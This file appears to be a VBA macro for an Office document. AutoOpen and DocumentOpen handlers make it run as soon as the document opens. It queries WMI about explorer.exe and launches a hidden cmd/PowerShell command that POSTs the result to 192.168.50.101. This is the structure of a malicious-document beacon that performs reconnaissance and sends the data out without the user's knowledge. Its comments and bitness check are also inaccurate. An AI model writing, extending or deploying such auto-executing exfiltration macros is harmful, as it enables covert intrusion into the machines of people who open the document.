Option Explicit

Sub SendProcessInfo()
    Dim processName As String
    Dim is64Bit As Boolean
    Dim result As String
    Dim wmiService As Object
    Dim processList As Object
    Dim processItem As Object
    Dim psCommand As String

    processName = "explorer.exe" ' Use uppercase for process name for consistency
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")

    If processList.Count > 0 Then
        For Each processItem In processList
            ' Check if the executable is located in "Program Files (x86)"
            is64Bit = (InStr(1, processItem.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)
            Exit For ' Only need to check the first matching process
        Next processItem
        result = "{""process"": """ & processName & """, ""64bit"": " & CStr(is64Bit) & "}"
    Else
        result = "{""process"": """ & processName & """, ""status"": ""not found""}"
    End If

    ' Prepare the PowerShell command
    psCommand = "powershell -Command ""Invoke-RestMethod -Uri 'http://192.168.50.101' -Method Post -Body '" & result & "' -ContentType 'application/json'"""

    ' Execute the PowerShell command
    Shell "cmd.exe /c " & psCommand, vbHide
End Sub

Sub AutoOpen()
SendProcessInfo
End Sub
Sub DocumentOpen()
SendProcessInfo
End Sub
